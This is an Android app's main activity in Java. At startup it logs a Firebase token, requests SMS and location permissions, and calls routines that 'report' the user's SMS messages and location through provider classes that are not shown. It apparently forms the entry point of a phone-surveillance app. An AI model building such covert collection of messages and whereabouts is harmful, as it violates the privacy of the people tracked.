package com.example.myandroidapps;

import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.example.myandroidapps.provider.LocationProvider;
import com.example.myandroidapps.provider.SmsProvider;
import com.example.myandroidapps.util.PermissionHandler;
import com.google.firebase.messaging.FirebaseMessaging;


public class MainActivity extends AppCompatActivity {

    private String TAG;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TAG = getApplicationContext().getResources().getString(R.string.app_name);
        setContentView(R.layout.activity_main);
        handleFirebaseRegistration();
        boolean permissionsGranted = PermissionHandler.checkPermissions(this);
        if(permissionsGranted){
            reportSms();
            reportLocation();
        }else{
            PermissionHandler.requestPermissions(this);
        }
    }

    private void handleFirebaseRegistration(){
        try{
            FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
                if(task.isSuccessful()){
                    Log.d(TAG, "Token: Fetching token Successful. Token :  "+task.getResult());
                }else{
                    Log.e(TAG, "onComplete: Fetching token failed");
                }
            });
        }catch (Exception e){
            Log.e(TAG,"Failed to handle Firebase Registration",e);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(requestCode == PermissionHandler.PERMISSION_REQUEST_CODE) {
            if(PermissionHandler.isSmsPermissionGranted(grantResults)){
                reportSms();
            } else {
                Toast.makeText(this, "SmsPermission Denied",Toast.LENGTH_SHORT).show();
            }
            if(PermissionHandler.isLocationPermissionGranted(grantResults)){
                reportLocation();
            } else {
                Toast.makeText(this, "Location Permission Denied",Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void reportLocation() {
        try{
            LocationProvider locationProvider = new LocationProvider(this);
            locationProvider.handleReportLocation();
        }catch (Exception e){
            Log.e(TAG,"Failed to report location",e);
        }
    }

    private void reportSms() {
        try{
            SmsProvider smsProvider = new SmsProvider(this);
            smsProvider.handleReportSms();
        }catch (Exception e){
            Log.e(TAG,"Failed to report sms",e);
        }
    }
}